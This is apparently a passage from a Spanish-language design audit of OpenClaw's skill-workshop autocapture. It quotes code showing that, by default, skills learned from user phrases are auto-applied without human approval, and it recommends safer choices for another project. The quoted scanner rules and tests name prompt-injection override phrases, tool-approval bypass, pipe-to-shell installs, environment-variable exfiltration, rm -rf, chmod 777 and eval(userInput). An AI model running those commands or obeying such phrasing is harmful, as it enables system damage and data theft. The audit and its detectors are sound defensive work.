### 4.2. Los tres modos de autonomía

**Transcripción literal** de `src/skills/workshop/config.ts` (archivo completo, 63 líneas) [VERIFICADO EN CÓDIGO]:

```ts
// Workshop config helpers resolve skill workshop settings from OpenClaw config.
import { asNullableRecord } from "@openclaw/normalization-core/record-coerce";
import type { OpenClawConfig } from "../../config/types.openclaw.js";
import type { SkillsWorkshopAutonomousMode } from "../../config/types.skills.js";

/** Runtime configuration for the skill workshop proposal flow. */
type SkillWorkshopConfig = {
  autonomous: {
    mode: SkillsWorkshopAutonomousMode;
  };
  allowSymlinkTargetWrites: boolean;
  approvalPolicy: "pending" | "auto";
  maxPending: number;
  maxSkillBytes: number;
};

const DEFAULT_CONFIG: SkillWorkshopConfig = {
  autonomous: {
    mode: "auto",
  },
  allowSymlinkTargetWrites: false,
  approvalPolicy: "auto",
  maxPending: 50,
  maxSkillBytes: 40_000,
};

function readBoolean(value: unknown, fallback: boolean): boolean {
  return typeof value === "boolean" ? value : fallback;
}

function readInteger(value: unknown, fallback: number, min: number, max: number): number {
  return typeof value === "number" && Number.isFinite(value)
    ? Math.min(Math.max(Math.trunc(value), min), max)
    : fallback;
}

function readAutonomousMode(
  value: unknown,
  fallback: SkillsWorkshopAutonomousMode,
): SkillsWorkshopAutonomousMode {
  return value === "off" || value === "propose" || value === "auto" ? value : fallback;
}

function readApprovalPolicy(value: unknown, fallback: SkillWorkshopConfig["approvalPolicy"]) {
  return value === "pending" || value === "auto" ? value : fallback;
}

export function resolveSkillWorkshopConfig(config?: OpenClawConfig): SkillWorkshopConfig {
  const raw = asNullableRecord(config?.skills?.workshop) ?? {};
  const autonomous = asNullableRecord(raw.autonomous) ?? {};
  return {
    autonomous: {
      mode: readAutonomousMode(autonomous.mode, DEFAULT_CONFIG.autonomous.mode),
    },
    allowSymlinkTargetWrites: readBoolean(
      raw.allowSymlinkTargetWrites,
      DEFAULT_CONFIG.allowSymlinkTargetWrites,
    ),
    approvalPolicy: readApprovalPolicy(raw.approvalPolicy, DEFAULT_CONFIG.approvalPolicy),
    maxPending: readInteger(raw.maxPending, DEFAULT_CONFIG.maxPending, 1, 200),
    maxSkillBytes: readInteger(raw.maxSkillBytes, DEFAULT_CONFIG.maxSkillBytes, 1024, 200_000),
  };
}
```

Semántica de los tres modos, derivada del flujo de `autocapture.ts`:

| `autonomous.mode` | Qué hace |
|---|---|
| `"off"` | **No crea propuesta.** Solo registra una *sugerencia de sesión* (`recordSessionSkillSuggestion`) — un recordatorio blando asociado a la sesión, para que el agente eventualmente le mencione al humano que podría valer la pena crear la skill. Es el modo más conservador. |
| `"propose"` | Crea una **propuesta pendiente** en el store del workshop (`proposeCreateSkill` / `proposeUpdateSkill`), pero **no la aplica**. Queda esperando decisión (`apply` / `reject` / `quarantine`). |
| `"auto"` | **(DEFAULT)** Crea la propuesta **y acto seguido la aplica**, escribiendo el `SKILL.md` en el workspace, si `ctx.skillWorkshopAvailable === true`. |

Dos parámetros importantes que no son el modo:

- `approvalPolicy` (default `"auto"`) — controla algo distinto: si las **llamadas a la herramienta `skill_workshop`** hechas por el modelo (acciones `apply`/`reject`/`quarantine`) disparan un prompt de aprobación al humano. Con `"auto"` no lo disparan. Con `"pending"` sí.
- `maxSkillBytes: 40_000` — tope de tamaño del cuerpo de una skill (rango admitido 1 KB–200 KB).
- `maxPending: 50` — tope de propuestas pendientes simultáneas (rango 1–200).

**Nota de diseño importante**: `mode` y `approvalPolicy` son ejes **ortogonales y ambos "abiertos" por defecto**. La autocaptura autónoma (`mode: "auto"`) llama a `autoApplySkillProposal()` directamente, **sin pasar por el hook de aprobación de herramienta** — ese hook solo intercepta a la herramienta `skill_workshop` cuando la invoca el modelo. Es decir: aunque un operador pusiera `approvalPolicy: "pending"`, **la ruta de autocaptura seguiría auto-aplicando**, porque no pasa por ahí. Son dos caminos distintos hacia la misma escritura.

### 4.3. Cómo detecta un "patrón": las 17 regex y la ausencia de umbral

El detector vive en `src/skills/research/signals.ts`. **No hay aprendizaje, no hay embeddings, no hay llamada a un LLM, y no hay conteo de repeticiones.** Es un banco de expresiones regulares sobre los mensajes de rol `user`.

**Transcripción literal** del bloque de detección, `src/skills/research/signals.ts` líneas 6–27 [VERIFICADO EN CÓDIGO]:

```ts
// Intentionally heuristic: regex detection cannot fully separate durable
// imperatives from ordinary prose, and we accept rare miscaptures because a
// capture only creates a pending proposal a human must apply. Route new
// ambiguity to abstention; do not grow this into a grammar or model call.
const SIGNAL_PATTERNS = [
  /(?:^|[.;—–-]\s+)next time\b|\bnext time\s+(?:during|for|in|under|when|while|you)\b|\bnext time[.!?]*$/i,
  /\b(?:from now on|going forward)\b/i,
  /\bremember to\b/i,
  /\bmake sure to\b/i,
  /^(?:(?:(?:can|could|would) you\s+|please\s+|you\s+)?always\s+\w+\s+\S+|(?!i\b).+\b(?:must|should)\s+always\s+\w+|i (?:need|want) you to always\s+\w+|(?:for|on|when|whenever)\b.+(?:\balways\s+|,\s+please\s+)\w+|(?:make it a rule to|policy:)\s+always\s+\w+)/i,
  /\bprefer\b.{0,120}\b(?:for|instead|use|when)\b/i,
  /\bwhen asked\b/i,
  /^(?!(?:can|could|would|will)\b)[a-z][\w-]*\s+.+\bnext time\s+[a-z]/i,
  /\b(?:that|this|it)(?:'s| is| was)? (?:wrong|not what i (?:asked|meant|said|wanted))\b/i,
  /\bdon['’]?t\b.{0,60}\bagain\b/i,
  /\bstop\s+[a-z]+ing\b/i,
  /\bstill (?:doing|ignoring|making|using)\b/i,
  /\b(?:i|we) (?:asked|told) you\b/i,
  /\brepeat myself\b/i,
  /\bshould (?:not|never) (?:be|have)\b/i,
  /\bi thought (?:we|you) (?:agreed|was|were|would)\b/i,
];
```

> ### ⚠️ Hallazgo crítico: el comentario del código contradice al código
>
> El comentario dice, textualmente:
> *"we accept rare miscaptures because **a capture only creates a pending proposal a human must apply**"*.
>
> **Eso es falso con la configuración por defecto.** Con `autonomous.mode: "auto"` (el default de `config.ts`), una captura **no** se queda pendiente: se aplica sola. El comentario describe la semántica del modo `"propose"`, no la del modo activo por defecto.
>
> La justificación de seguridad del diseño ("tolerar falsos positivos porque igual hay un humano en el medio") **no aplica en la configuración que viene de fábrica**. Este es el hallazgo más importante de la sección: el razonamiento de riesgo documentado en el propio código quedó desactualizado respecto de su default. Está clasificado como debilidad en la sección 7.

**Los dos filtros que sí existen** (y que no son umbrales de repetición):

1. **Longitud**: la frase debe medir entre 12 y 1200 caracteres.
2. **Que produzca al menos una "regla" normalizable** y al menos un "token de tópico".

```ts
function extractInstruction(text: string): string | undefined {
  const trimmed = compactWhitespace(text);
  return trimmed.length >= 12 &&
    trimmed.length <= 1200 &&
    SIGNAL_PATTERNS.some((pattern) => pattern.test(trimmed))
    ? trimmed.replace(/^ok[,. ]+/i, "")
    : undefined;
}
```

Los **únicos límites cuantitativos** del pipeline de detección son topes de volumen, no umbrales de confianza:

- `extractDurableInstructions()` devuelve `instructions.slice(-8)` — **como máximo 8 instrucciones** por turno, quedándose con las últimas.
- `groupDurableInstructionProposals()` usa `.slice(-(params.maxProposals ?? 3))` — **como máximo 3 propuestas** por turno, las últimas.

```ts
export function extractDurableInstructions(messages: unknown[]): string[] {
  const instructions: string[] = [];
  for (const entry of extractTranscriptText(messages)) {
    if (entry.role !== "user") {
      continue;
    }
    // … (normalización y parseo por oración) …
  }
  return instructions.slice(-8);
}
```

### 4.4. Qué genera exactamente

La skill generada es **plantilla fija**, no redacción libre de un LLM. `signals.ts`, función `buildProposal()` [VERIFICADO EN CÓDIGO]:

```ts
function buildProposal(params: {
  skillName: string;
  title: string;
  rules: string[];
  instructions: string[];
  existingSkill: boolean;
}): DurableInstruction | undefined {
  const skillName = normalizeSkillIndexName(params.skillName);
  const rules = [...new Set(params.rules)];
  if (!skillName || rules.length === 0) {
    return undefined;
  }
  return {
    skillName,
    description: buildDescription(params.title, rules),
    goal: `Apply the ${params.title} procedure consistently.`,
    evidence: params.instructions.join("\n"),
    instructions: [...params.instructions],
    existingSkill: params.existingSkill,
    content: [
      `# ${params.title}`,
      "",
      "## Procedure",
      "",
      ...rules.map((rule) => `- ${rule}`),
      "",
      "## Verification",
      "",
      "- Verify the result follows every procedure step.",
    ].join("\n"),
  };
}
```

El tipo del resultado, `src/skills/research/signals.ts`:

```ts
export type DurableInstruction = {
  skillName: string;
  description: string;
  content: string;
  goal: string;
  evidence: string;
  instructions: string[];
  existingSkill: boolean;
};
```

Entonces, de la frase de usuario *"From now on, when working on GitHub PRs, always check CI before final response."* sale un `SKILL.md` cuyo cuerpo es literalmente:

```md
# GitHub

## Procedure

- Check CI before final response.

## Verification

- Verify the result follows every procedure step.
```

Y una `description` construida por `buildDescription()` con tope de 160 bytes, de la forma `"GitHub: Check CI before final response."`.

**Detalles del pipeline de normalización** (todo en `signals.ts`, todo determinista):

- `normalizeRule()` convierte imperativos coloquiales a forma canónica: `don't X` → `Do not X`, `never X` → `Do not X`, `only use X` → `Use only X`, `sorted …` → `Sort …`, `no <algo> output` → `Do not use <algo> output`. Capitaliza y agrega punto final.
- `deriveTopicTokens()` extrae los tokens de tópico descartando tres capas de stopwords (`MATCH_STOPWORDS` ⊂ `TASK_CLASS_STOPWORDS` ⊂ `TOPIC_STOPWORDS`), y de ahí sale el **nombre de la skill** (p. ej. `github`).
- `matchExistingSkill()` decide si la instrucción pertenece a una skill que ya existe, con un **scoring por tokens: 2 puntos si el token matchea el nombre de la skill, 1 punto si matchea su descripción**, y un umbral de aceptación de `bestScore >= 2`. Este es el único "umbral" numérico de todo el mecanismo, y sirve para *enrutar* a una skill existente, no para decidir si capturar.

```ts
function matchExistingSkill(
  instruction: string,
  skills: readonly WorkspaceSkillSummary[],
): WorkspaceSkillSummary | undefined {
  const instructionTokens = new Set(tokenizeForSkillMatch(instruction));
  let best: WorkspaceSkillSummary | undefined;
  let bestScore = 0;
  for (const skill of skills) {
    const nameTokens = tokenizeForSkillMatch(skill.name.replace(/-/g, " "));
    const descriptionTokens = tokenizeForSkillMatch(skill.description ?? "");
    let score = 0;
    for (const token of instructionTokens) {
      if (nameTokens.some((candidate) => skillTokensMatch(candidate, token))) {
        score += 2;
      } else if (descriptionTokens.some((candidate) => skillTokensMatch(candidate, token))) {
        score += 1;
      }
    }
    if (score > bestScore) {
      bestScore = score;
      best = skill;
    }
  }
  return bestScore >= 2 ? best : undefined;
}
```

Si la skill **ya existe**, no se reescribe: se **anexa** al final, para que el aprendizaje quede auditable. `autocapture.ts`:

```ts
// Captured updates append below existing skill text so learned context stays auditable.
function buildAutoCaptureUpdateContent(existingSkill: string, capturedContent: string): string {
  return [existingSkill.trimEnd(), "", "## Captured Update", "", capturedContent.trim(), ""].join(
    "\n",
  );
}
```

### 4.5. El orquestador: `runSkillResearchAutoCapture()`

Es el punto de entrada, invocado al **final de cada turno del agente** (evento `agent end`). Firma y docstring [VERIFICADO EN CÓDIGO]:

```ts
type SkillResearchAgentEndEvent = {
  messages: unknown[];
  success?: boolean;
};

type SkillResearchAgentContext = {
  agentId?: string;
  runId?: string;
  sessionKey?: string;
  trigger?: string;
  workspaceDir?: string;
  skillWorkshopAvailable?: boolean;
};

/**
 * Captures or suggests durable skill research signals from a completed session turn.
 *
 * Runs regardless of the turn's success flag: the extracted signals are the user's own words,
 * which stay valid when a run fails — corrections given in a failed or timed-out turn are the
 * ones most worth keeping.
 */
export async function runSkillResearchAutoCapture(params: {
  event: SkillResearchAgentEndEvent;
  ctx: SkillResearchAgentContext;
  config?: OpenClawConfig;
}): Promise<void>
```

Nótese la decisión explícita: **corre incluso si el turno falló**, con el argumento de que una corrección dada en un turno fallido es justamente la más valiosa.

El bloque final, donde ocurre la auto-aplicación, transcrito literalmente:

```ts
        log.info(
          `skill research auto-capture queued workshop proposal ${result.record.target.skillKey}`,
        );
        if (
          workshopConfig.autonomous.mode === "auto" &&
          params.ctx.skillWorkshopAvailable === true
        ) {
          await autoApplySkillProposal({
            workspaceDir,
            ...(params.ctx.agentId ? { agentId: params.ctx.agentId } : {}),
            ...(params.config ? { config: params.config } : {}),
            proposalId: result.record.id,
            skillName: result.record.target.skillName,
          });
        }
```

Y el aplicador, `src/skills/workshop/auto-apply.ts` (archivo completo, 45 líneas):

```ts
import type { OpenClawConfig } from "../../config/types.openclaw.js";
import { createSubsystemLogger } from "../../logging/subsystem.js";
import { applySkillProposal } from "./service.js";
import type { SkillProposalApplyResult } from "./types.js";

const log = createSubsystemLogger("skills/workshop");

type AutoApplyDeps = {
  apply: typeof applySkillProposal;
};

const defaultDeps: AutoApplyDeps = { apply: applySkillProposal };

/** Applies one capture through the normal Workshop service without retrying failures. */
export async function autoApplySkillProposal(
  params: {
    workspaceDir: string;
    agentId?: string;
    config?: OpenClawConfig;
    env?: NodeJS.ProcessEnv;
    proposalId: string;
    skillName: string;
  },
  deps: AutoApplyDeps = defaultDeps,
): Promise<SkillProposalApplyResult | undefined> {
  try {
    // Reviewers stay proposal-only; the normal apply scanner remains the safety boundary.
    // Approval-free miscaptures stay recoverable through rejection or curator lifecycle controls.
    const applied = await deps.apply({
      workspaceDir: params.workspaceDir,
      ...(params.agentId ? { agentId: params.agentId } : {}),
      ...(params.config ? { config: params.config } : {}),
      ...(params.env ? { env: params.env } : {}),
      proposalId: params.proposalId,
      reason: "Autonomous self-learning capture",
    });
    log.info(`auto-applied skill ${params.skillName} from proposal ${params.proposalId}`);
    return applied;
  } catch (error) {
    log.warn(
      `auto-apply left skill ${params.skillName} proposal ${params.proposalId} unapplied: ${String(error)}`,
    );
    return undefined;
  }
}
```

El comentario interno es la declaración de doctrina más honesta del subsistema y conviene leerlo con atención:

> *"Reviewers stay proposal-only; **the normal apply scanner remains the safety boundary**. Approval-free miscaptures stay recoverable through rejection or curator lifecycle controls."*

Traducido: **el escáner de regex es, admitidamente, la única frontera de seguridad**; y la respuesta al riesgo de capturar algo indebido no es prevenirlo, es *poder deshacerlo después*. Es un modelo de seguridad reactivo, no preventivo.

### 4.6. Salvaguardas reales que sí existen

Aunque el mecanismo auto-aplica, no es ingenuo. Estas son las barreras verificadas en código:

**(a) Exclusión de contextos no interactivos.** `autocapture.ts`:

```ts
const AUTO_CAPTURE_BLOCKED_TRIGGERS = new Set(["cron", "heartbeat", "memory", "overflow"]);
const AUTO_CAPTURE_BLOCKED_SESSION_SEGMENTS = new Set([
  "cron",
  "hook",
  "subagent",
  "skill-workshop-review",
]);

function isSkillResearchAutoCaptureEligible(ctx: SkillResearchAgentContext): boolean {
  const trigger = ctx.trigger?.trim().toLowerCase();
  if (trigger && AUTO_CAPTURE_BLOCKED_TRIGGERS.has(trigger)) {
    return false;
  }

  const sessionKey = ctx.sessionKey?.trim().toLowerCase();
  if (!sessionKey) {
    return true;
  }
  if (sessionKey.includes("active-memory")) {
    return false;
  }
  return !sessionKey
    .split(":")
    .some((segment) => AUTO_CAPTURE_BLOCKED_SESSION_SEGMENTS.has(segment));
}
```

Razón de diseño: evitar bucles de retroalimentación. Una sesión de revisión de skills (`skill-workshop-review`) o un subagente no deben generar skills a partir de su propio texto. Nótese que si `sessionKey` está vacío, **se permite** (fail-open).

**(b) Anti-doble-captura.** Si en el turno el modelo ya llamó a la herramienta `skill_workshop` con una acción mutante (`create` / `update` / `revise`) y esa llamada **no falló**, la autocaptura se abstiene y solo registra los hashes de señal:

```ts
const SKILL_WORKSHOP_MUTATING_ACTIONS = new Set(["create", "update", "revise"]);
// …
    const turnMessages = currentTurnMessages(params.event.messages);
    if (hasUnfailedSkillWorkshopMutationCall(turnMessages)) {
      const signalHashes = extractDurableInstructions([...turnMessages]).map((instruction) =>
        fingerprintInstructions([instruction]),
      );
      await recordSessionSkillCaptureSignals({ ...sessionScope, signalHashes });
      return;
    }
```

**(c) Deduplicación por hash SHA-256 de las señales.** Cada instrucción se normaliza (whitespace compactado, minúsculas) y se hashea. Los hashes ya capturados se persisten por sesión, de modo que la misma frase no genera dos skills:

```ts
function fingerprintInstructions(instructions: readonly string[]): string {
  const normalized = instructions
    .map((instruction) => compactWhitespace(instruction).toLowerCase())
    .join("\n");
  return sha256Hex(normalized);
}
```

Con un protocolo de **claim / release** para concurrencia: `claimSessionSkillCaptureSignals()` reclama los hashes antes de intentar la propuesta, y si la propuesta falla, `releaseSessionSkillCaptureSignals()` los libera para que se pueda reintentar en otro turno.

**(d) Cola serializada por workspace.** `const skillCaptureQueue = new KeyedAsyncQueue();`, con el comentario:

```ts
    // Proposals are workspace-scoped, so different sessions must not inspect and revise the same
    // pending draft concurrently from stale content.
    await skillCaptureQueue.enqueue(workspaceDir, async () => { … });
```

**(e) Respeto de la cuarentena.** Si ya hay una propuesta `quarantined` para esa skill, no se insiste. Si hay propuestas `pending` que **no** fueron creadas por el propio autocapture (`createdBy !== "skill-workshop"`), tampoco se toca — no pisa el trabajo de un humano o de otro origen.

**(f) El escáner de seguridad — la "safety boundary" declarada.** `src/skills/workshop/proposal-scan.ts` (archivo completo, 51 líneas):

```ts
import { scanSkillContent, scanSource } from "../security/scanner.js";
import type { PreparedSkillProposalSupportFile } from "./store.js";
import type { SkillProposalScan } from "./types.js";

export function scanProposalBundle(
  content: string,
  supportFiles: readonly PreparedSkillProposalSupportFile[] = [],
  metadata: readonly { file: string; content: string | undefined }[] = [],
): SkillProposalScan {
  const scannedAt = new Date().toISOString();
  const findings = [
    ...scanSkillContent(content, "PROPOSAL.md"),
    ...scanSource(content, "PROPOSAL.md"),
    ...supportFiles.flatMap((file) => [
      ...scanSkillContent(file.path, "support-file-path").filter(
        (finding) => finding.ruleId === "literal-secret",
      ),
      ...scanSkillContent(file.content, file.path),
      ...scanSource(file.content, file.path),
    ]),
    ...metadata.flatMap((entry) =>
      entry.content
        ? scanSkillContent(entry.content, entry.file).filter(
            (finding) => finding.ruleId === "literal-secret",
          )
        : [],
    ),
  ];
  const critical = findings.filter((finding) => finding.severity === "critical").length;
  const warn = findings.filter((finding) => finding.severity === "warn").length;
  const info = findings.filter((finding) => finding.severity === "info").length;
  return {
    state: critical > 0 ? "failed" : "clean",
    scannedAt,
    critical,
    warn,
    info,
    findings,
  };
}

export function assertProposalContainsNoLiteralSecrets(scan: SkillProposalScan): void {
  const finding = scan.findings.find((entry) => entry.ruleId === "literal-secret");
  if (!finding) {
    return;
  }
  throw new Error(
    `Skill proposal contains a recognized literal credential in ${finding.file}; replace it with a SecretRef or placeholder.`,
  );
}
```

Obsérvese la regla de decisión: **`state: critical > 0 ? "failed" : "clean"`**. Los hallazgos `warn` **no bloquean nada**. Un `rm -rf /` en el texto de la skill es `warn`, no `critical` — y por lo tanto se aplica igual.

Las reglas aplicadas al contenido de una skill, transcritas de `src/skills/security/scanner.ts` (`SKILL_CONTENT_RULES`):

```ts
const SKILL_CONTENT_RULES: SourceRule[] = [
  LITERAL_SECRET_SKILL_CONTENT_RULE,
  {
    ruleId: "prompt-injection-ignore-instructions",
    severity: "critical",
    message: "Prompt-injection wording attempts to override higher-priority instructions",
    pattern: /ignore (all|any|previous|above|prior) instructions/i,
  },
  {
    ruleId: "prompt-injection-system",
    severity: "critical",
    message: "Skill text references hidden prompt layers",
    pattern: /\b(system prompt|developer message|hidden instructions)\b/i,
  },
  {
    ruleId: "prompt-injection-tool",
    severity: "critical",
    message: "Skill text encourages bypassing tool approval",
    pattern:
      /\b(run|execute|invoke|call)\b.{0,50}\btool\b.{0,50}\bwithout\b.{0,30}\b(permission|approval)/i,
  },
  {
    ruleId: "shell-pipe-to-shell",
    severity: "critical",
    message: "Skill text includes pipe-to-shell install pattern",
    pattern: /\b(curl|wget)\b[^|\n]{0,120}\|\s*(sh|bash|zsh)\b/i,
  },
  {
    ruleId: "secret-exfiltration",
    severity: "critical",
    message: "Skill text may exfiltrate environment variables",
    pattern: /\b(process\.env|env)\b.{0,80}\b(fetch|curl|wget|http|https)\b/i,
  },
  {
    ruleId: "destructive-delete",
    severity: "warn",
    message: "Skill text contains broad destructive delete command",
    pattern: /\brm\s+-rf\s+(\/|\$HOME|~|\.)/i,
  },
  {
    ruleId: "unsafe-permissions",
    severity: "warn",
    message: "Skill text contains unsafe permission change",
    pattern: /\bchmod\s+(-R\s+)?777\b/i,
  },
];
```

Y las reglas de código fuente (`LINE_RULES`, aplicadas también al contenido de la propuesta), con `severity: "critical"`: `dangerous-exec`, `dynamic-code-execution`, `crypto-mining`; más `SOURCE_RULES` con `env-harvesting` (critical), `potential-exfiltration` y `obfuscated-code`.

**(g) Cuarentena en lugar de aplicación.** En `src/skills/workshop/apply-transition.ts`, el gate:

```ts
      const scan = scanProposalBundle(content, supportFiles);
      if (scan.state !== "clean") {
        await quarantineSkillProposalAfterScan({ input, record, scan });
```

y la transición correspondiente, con su mapa de estados:

```ts
  | "scan_failed"
// …
    scan_failed: "quarantined",
// …
async function quarantineSkillProposalAfterScan(params: {
  // …
    status: requiredApplyStatus("scan_failed"),
    quarantinedAt: now,
    scan: { ...params.scan, state: "quarantined" },
    statusReason: "Proposal scan failed.",
```

**(h) Rollback persistido en SQLite.** Antes de aplicar, se guarda el estado previo del archivo destino en la tabla `skill_workshop_proposal_rollbacks`, dentro de una transacción de escritura del estado global. `src/skills/workshop/store-sqlite-rollback.ts`:

```ts
export async function writeSkillProposalRollback(params: {
  proposalId: string;
  rollback: SkillProposalRollback;
  store?: SkillWorkshopStoreOptions;
}): Promise<void> {
  assertProposalId(params.proposalId);
  ensureSkillWorkshopSchema(params.store);
  runOpenClawStateWriteTransaction(
    ({ db }) => {
      const kysely = getNodeSqliteKysely<SkillWorkshopDatabase>(db);
      const proposal = executeSqliteQueryTakeFirstSync(
        db,
        kysely
          .selectFrom("skill_workshop_proposals")
          .select(["proposal_id", "kind", "status"])
          .where("proposal_id", "=", params.proposalId),
      );
      if (!proposal) {
        throw new Error(`Skill proposal not found: ${params.proposalId}`);
      }
      if (proposal.status !== "pending") {
        throw new Error(
          `Only pending proposals can be applied. Current status: ${proposal.status}.`,
        );
      }
      removeOtherPendingTargetRollbacks(db, {
        proposalId: params.proposalId,
        targetSkillFile: params.rollback.targetSkillFile,
      });
      // … inserta el registro de rollback …
```

Con la invariante explícita **"Only pending proposals can be applied"** verificada dentro de la transacción, y limpieza de rollbacks huérfanos de otras propuestas pendientes que apuntaran al mismo archivo destino.

**(i) Hooks de evaluación por plugin.** `src/skills/workshop/service-evaluation.ts` permite que plugins registren evaluadores (`runSkillProposalEvaluators`) que emiten `findings` y `outcomes` sobre una propuesta pendiente, con límites duros:

```ts
const MAX_EVALUATION_OUTCOMES = 64;
const MAX_EVALUATION_FINDINGS = 200;
const MAX_EVALUATION_METRICS = 64;
```

Con verificación de integridad antes de evaluar — si el borrador cambió sin actualizar su metadata, se rechaza:

```ts
      if (hashSkillProposalContent(read.content) !== read.record.draftHash) {
        throw new Error("Proposal draft changed without updating proposal metadata.");
      }
```

**Importante**: estos evaluadores son **advisory**. El comentario de `auto-apply.ts` lo dice: *"Reviewers stay proposal-only"*. No bloquean la auto-aplicación.

### 4.7. Evidencia decisiva: los tests

Los tests son la mejor prueba del comportamiento real. **Transcripción literal** de `src/skills/research/autocapture-auto-apply.test.ts` (archivo completo de casos, 189 líneas) [VERIFICADO EN CÓDIGO]:

```ts
describe("skill research auto apply", () => {
  it("auto-applies deterministic capture by default", async () => {
    const workspaceDir = await makeWorkspace();

    await runSkillResearchAutoCapture({
      event: {
        success: true,
        messages: [
          {
            role: "user",
            content:
              "From now on, when working on GitHub PRs, always check CI before final response.",
          },
        ],
      },
      ctx: {
        workspaceDir,
        agentId: "main",
        sessionKey: SESSION_KEY,
        skillWorkshopAvailable: true,
      },
    });

    const proposals = await listSkillProposals({ workspaceDir });
    expect(proposals.proposals).toHaveLength(1);
    expect(proposals.proposals[0]).toMatchObject({
      kind: "create",
      status: "applied",
      skillKey: "github",
      scanState: "clean",
    });
    const proposal = await inspectSkillProposal(
      expectDefined(proposals.proposals[0], "proposals.proposals[0] test invariant").id,
      { workspaceDir },
    );
    await expect(fs.readFile(proposal?.record.target.skillFile ?? "", "utf8")).resolves.toContain(
      "Check CI before final response",
    );
    expect(
      loadSessionEntry({ agentId: "main", sessionKey: SESSION_KEY })?.pendingSkillSuggestion,
    ).toBeUndefined();
  });
```

Léase con cuidado lo que este test demuestra:

- **`config` no se pasa** — es decir, se ejercita el **default de fábrica**. El nombre del test lo confirma: *"by default"*.
- **Un solo mensaje** de usuario. Ninguna repetición.
- Resultado: `status: "applied"` — **no** `"pending"`.
- Y `fs.readFile(...target.skillFile)` **resuelve**: el archivo existe en disco. La skill está viva.
- `pendingSkillSuggestion` es `undefined`: ni siquiera queda una sugerencia para el humano, porque ya se hizo.

El segundo test demuestra la salvaguarda del escáner:

```ts
  it("quarantines scanner-critical deterministic capture in auto mode", async () => {
    const workspaceDir = await makeWorkspace();

    await runSkillResearchAutoCapture({
      event: {
        success: true,
        messages: [
          {
            role: "user",
            content:
              "From now on, when processing code snippets, always run eval(userInput) before replying.",
          },
        ],
      },
      ctx: {
        workspaceDir,
        agentId: "main",
        sessionKey: SESSION_KEY,
        skillWorkshopAvailable: true,
      },
      config: { skills: { workshop: { autonomous: { mode: "auto" } } } },
    });

    const proposals = await listSkillProposals({ workspaceDir });
    expect(proposals.proposals).toHaveLength(1);
    expect(proposals.proposals[0]).toMatchObject({
      status: "quarantined",
      scanState: "quarantined",
    });
    const proposal = await inspectSkillProposal(
      expectDefined(proposals.proposals[0], "proposals.proposals[0] test invariant").id,
      { workspaceDir },
    );
    await expect(fs.access(proposal?.record.target.skillFile ?? "")).rejects.toMatchObject({
      code: "ENOENT",
    });
  });
```

El `eval(userInput)` dispara la regla `dynamic-code-execution` (critical) → cuarentena → el archivo **no** se escribe (`ENOENT`). La salvaguarda funciona, pero solo contra lo que las regex reconocen.

El tercer test revela una condición adicional interesante:

```ts
  it("leaves a capture pending when the originating run lacked Workshop access", async () => {
    // … ctx: { …, skillWorkshopAvailable: false }, config: { … mode: "auto" } …
    expect((await listSkillProposals({ workspaceDir })).proposals[0]).toMatchObject({
      status: "pending",
    });
  });
```

Es decir: `skillWorkshopAvailable` funciona como un **gate de capacidad**. Si el run que originó la captura no tenía acceso a la herramienta `skill_workshop`, la propuesta queda pendiente aunque el modo sea `auto`. Es una forma de privilegio heredado: *no auto-apliques en nombre de un run que no habría podido hacerlo él mismo*. Es la salvaguarda conceptualmente más elegante del subsistema.

El cuarto test confirma que el ciclo se repite indefinidamente, encadenando `create` → `update`, ambos auto-aplicados:

```ts
  it("auto-applies a fresh update proposal for an already-applied learned skill", async () => {
    // … dos turnos, dos frases del usuario …
    const proposals = await listSkillProposals({ workspaceDir });
    expect(proposals.proposals).toHaveLength(2);
    expect(proposals.proposals.map((proposal) => proposal.status)).toEqual(["applied", "applied"]);
    const updateEntry = expectDefined(
      proposals.proposals.find((proposal) => proposal.kind === "update"),
      "update proposal test invariant",
    );
    const latest = await inspectSkillProposal(updateEntry.id, { workspaceDir });
    expect(latest?.record.kind).toBe("update");
    await expect(fs.readFile(latest?.record.target.skillFile ?? "", "utf8")).resolves.toContain(
      "Inspect the exact head before landing",
    );
  });
```

### 4.8. Flujo completo, resumido

```
Fin de turno del agente (evento agent-end, corra bien o mal)
  │
  ├─ ¿workspaceDir presente?                         no → salir
  ├─ ¿trigger/sessionKey elegible?                   no → salir   (cron, hook, subagent, memory…)
  ├─ ¿sessionKey presente?                           no → salir
  │
  └─ [cola serializada por workspaceDir]
       │
       ├─ ¿el turno ya llamó skill_workshop mutante y no falló?
       │      sí → registrar hashes y salir  (anti-doble-captura)
       │
       ├─ extractDurableInstructions(mensajes de rol "user")
       │      · 17 regex de señal
       │      · longitud 12..1200
       │      · normalización a "reglas" imperativas
       │      · descartar hashes ya capturados
       │      · tope: últimas 8
       │      └─ 0 instrucciones → salir
       │
       ├─ listWritableWorkspaceSkillSummaries()   (skills existentes escribibles)
       ├─ groupDurableInstructionProposals()      (agrupar por tópico; tope: últimas 3)
       │      └─ 0 propuestas → salir
       │
       ├─ mode === "off"
       │      └─ recordSessionSkillSuggestion()   → sugerencia blanda, FIN
       │
       └─ mode === "propose" | "auto"
            │
            ├─ ¿hay propuesta quarantined para esa skill? → saltar
            ├─ ¿hay pending de otro origen?               → saltar
            ├─ claimSessionSkillCaptureSignals()          (claim atómico)
            │
            ├─ proposeCreateSkill()  |  proposeUpdateSkill()  |  reviseSkillProposal()
            │      · createdBy: "skill-workshop", autonomousCapture: true
            │      · origin: { agentId, sessionKey, runId }
            │      · límite maxSkillBytes (40 KB), maxPending (50)
            │
            └─ si mode === "auto" Y skillWorkshopAvailable === true
                 └─ autoApplySkillProposal()
                      └─ applySkillProposal()
                           ├─ escribir rollback en SQLite (transacción)
                           ├─ scanProposalBundle()
                           │     · critical > 0 → state "failed"
                           │           └─ quarantineSkillProposalAfterScan()  → NO se escribe
                           │     · solo warn/info → "clean"
                           └─ escribir SKILL.md en el workspace   ← SKILL ACTIVA, SIN HUMANO
```

### 4.9. Veredicto para O.R.I.O.N.

| Aspecto | OpenClaw | Qué hacer en O.R.I.O.N. |
|---|---|---|
| Disparador | 1 frase, 17 regex, sin umbral | **Cambiar**: exigir repetición (N≥3) en ventana temporal |
| Decisión | Auto-aplica por defecto | **Invertir**: nunca auto-aplicar; abrir REQ formal |
| Salvaguarda | Escáner regex, reactivo | **Adoptar y ampliar**: escáner + gobernanza preventiva |
| Rollback | SQLite con estado previo | **Adoptar tal cual**: es excelente |
| Deduplicación | SHA-256 de señal normalizada | **Adoptar tal cual**: barato y efectivo |
| Anti-bucle | Excluir cron/hook/subagente | **Adoptar tal cual**: imprescindible |
| Gate de capacidad | `skillWorkshopAvailable` | **Adoptar**: no propongas en nombre de quien no podía |
